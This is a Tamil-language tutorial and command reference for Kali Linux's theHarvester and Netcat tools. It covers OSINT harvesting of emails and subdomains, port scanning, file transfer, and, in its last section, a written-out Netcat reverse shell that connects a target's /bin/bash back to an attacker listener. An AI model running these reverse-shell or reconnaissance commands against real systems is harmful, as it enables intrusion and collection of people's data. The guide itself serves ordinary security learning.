# Kali Linux Inbuilt Package #13: theHarvester & Netcat (`theHarvester` / `nc`) Technical Reference & Setup Guide

---

## 1. Deep Technical Introduction & Architecture (ஆழ்ந்த தொழில்நுட்ப அறிமுகம்)

**theHarvester** என்பது Kali Linux-ல் இயல்பாகவே (Inbuilt) வரும் **OSINT (Open Source Intelligence) Reconnaissance Tool** ஆகும். ஒரு நிறுவனம் அல்லது டொமைனைப் பற்றிய Email முகவரிகள், Subdomains, IP முகவரிகள் மற்றும் பணியாளர்கள் பெயர்களை பகிரங்க Search Engines மற்றும் பிற Public Sources மூலம் சேகரிக்க இது பயன்படுகிறது.

**Netcat (`nc`)** என்பது "Networking-ன் Swiss Army Knife" என அழைக்கப்படும் ஒரு General-Purpose Networking Utility. TCP/UDP இணைப்புகளை உருவாக்கவும், கேட்கவும் (Listen), போர்ட் ஸ்கேன் செய்யவும், மற்றும் கோப்புகளை/Shells-ஐ நெட்வொர்க் வழியாக அனுப்பவும் இது பயன்படுகிறது.

### ஆழமான தொழில்நுட்பக் கூறுகள் (Core Architecture & Mechanics):

* **theHarvester-ன் Passive Data Collection Engine:**
  * இலக்கு சர்வருடன் நேரடியாகத் தொடர்பு கொள்ளாமல் (Passive), Google, Bing, LinkedIn, Hunter.io, VirusTotal போன்ற Public APIs/Search Engines-ஐ வினவி (Query) தகவல்களைச் சேகரிக்கும். இதனால் இலக்கு சிஸ்டத்தின் Logs-ல் எந்த அடையாளமும் பதிவாகாது.

* **DNS Brute-Forcing & Reverse Lookup:**
  * கண்டறியப்பட்ட Subdomains-ஐ DNS Resolution மூலம் உறுதிப்படுத்தி, அவற்றின் IP முகவரிகளையும் கண்டறியும் திறன் கொண்டது.

* **Netcat-ன் Raw Socket Communication:**
  * TCP/UDP Socket-ஐ நேரடியாகத் திறந்து, எந்தவொரு Protocol Format-ஐயும் பின்பற்றாமல் Raw Data-வை அனுப்பவும் பெறவும் முடியும். இதனால் Port Scanning, Banner Grabbing, மற்றும் Backdoor Listener உருவாக்க இது பரவலாகப் பயன்படுகிறது.

* **Reverse & Bind Shell Mechanics:**
  * **Listener Mode (`-l`):** ஒரு குறிப்பிட்ட Port-ல் Netcat காத்திருந்து, உள்வரும் இணைப்பை ஏற்றுக்கொள்ளும் (Bind Shell).
  * **Client Mode:** இலக்கு கணினியிடமிருந்து நம்முடைய Netcat Listener-க்கு திரும்ப இணைக்கும் (Reverse Shell).

* **Infrastructure Use Case (உங்கள் லேப் / கடையின் நெட்வொர்க் சோதனைக்கு):**
  * உங்கள் கேமிங் சென்டரின் பெயரில் பகிரங்கமாக என்ன தகவல்கள் (Emails, Employee Names, Leaked Subdomains) இணையத்தில் கிடைக்கின்றன என்பதை theHarvester மூலம் அறியலாம்; Netcat மூலம் லோக்கல் நெட்வொர்க்கில் ஒரு குறிப்பிட்ட போர்ட் திறந்திருக்கிறதா என விரைவாகச் சோதிக்கலாம்.

---

## 2. Package Setup & Update Guide (நிறுவும் மற்றும் புதுப்பிக்கும் முறை)

Kali Linux-ல் theHarvester மற்றும் Netcat ஆகிய இரண்டும் ஏற்கனவே இன்ஸ்டால் செய்யப்பட்டிருக்கும்.

# 1. theHarvester மற்றும் Netcat பதிப்புகளைச் சரிபார்க்க
theHarvester -h
nc -h

# 2. System Packages மற்றும் இரு டூல்களையும் புதுப்பிக்க
sudo apt update && sudo apt install theharvester netcat-traditional -y

# 3. theHarvester ஆதரிக்கும் Data Sources பட்டியலைப் பார்க்க
theHarvester -h | grep -A 30 "sources"

---

## Categorized Command Reference & Syntax (கருவிகள் மற்றும் விளக்கங்கள்)

# A. theHarvester — OSINT Data Collection (தகவல் சேகரிப்பு)
theHarvester -d example.com -b google : `example.com` டொமைனுக்கான Email/Subdomain தகவல்களை Google மூலம் சேகரிக்கும் (-d = Domain, -b = Source).
theHarvester -d example.com -b all : அனைத்து ஆதரிக்கப்படும் Sources-லிருந்தும் (Google, Bing, LinkedIn etc.) ஒருங்கே தகவல் சேகரிக்கும்.
theHarvester -d example.com -b google -l 500 : தேடல் முடிவுகளின் எண்ணிக்கையை 500 ஆகக் கட்டுப்படுத்தும் (-l = Limit).
theHarvester -d example.com -b google -f report.html : முடிவுகளை ஒரு HTML அறிக்கையில் சேமிக்கும் (-f = Output File).

# B. Netcat — Port Scanning & Banner Grabbing (போர்ட் ஸ்கேன் & தகவல் சேகரிப்பு)
nc -zv 192.168.1.100 22 : குறிப்பிட்ட போர்ட் (22) திறந்திருக்கிறதா என வேகமாகச் சோதிக்கும் (-z = Zero-I/O / Scan Mode, -v = Verbose).
nc -zv 192.168.1.100 1-1000 : 1 முதல் 1000 வரையிலான போர்ட் வரம்பை ஒரே கட்டளையில் ஸ்கேன் செய்யும்.
nc 192.168.1.100 80 : குறிப்பிட்ட போர்ட்டுடன் நேரடியாக இணைந்து, அந்த சேவையின் Banner/Version தகவலை வாசிக்க உதவும்.

# C. Netcat — Listener & File Transfer (கேட்பான் மற்றும் கோப்பு பரிமாற்றம்)
nc -lvp 4444 : குறிப்பிட்ட Port (4444)-ல் உள்வரும் இணைப்புகளுக்காகக் காத்திருக்கும் (-l = Listen, -p = Port).
nc -lvp 4444 > received_file.txt : உள்வரும் இணைப்பிலிருந்து தரவைப் பெற்று ஒரு கோப்பில் சேமிக்கும்.
cat file.txt | nc 192.168.1.100 4444 : ஒரு கோப்பை நெட்வொர்க் வழியாக இலக்கு கணினியின் Netcat Listener-க்கு அனுப்பும்.

# D. Netcat — Reverse Shell Testing (லேப் சூழலில் Reverse Shell சோதனை)
nc -lvp 4444 : Attacker கணினியில் (Kali) Listener-ஐத் தொடங்கும்.
nc 192.168.1.50 4444 -e /bin/bash : இலக்கு Linux கணினியிலிருந்து, Listener கணினிக்கு Bash Shell-ஐத் திருப்பி இணைக்கும் (Reverse Shell — லேப் சூழலில் மட்டும் சோதிக்க வேண்டும்).
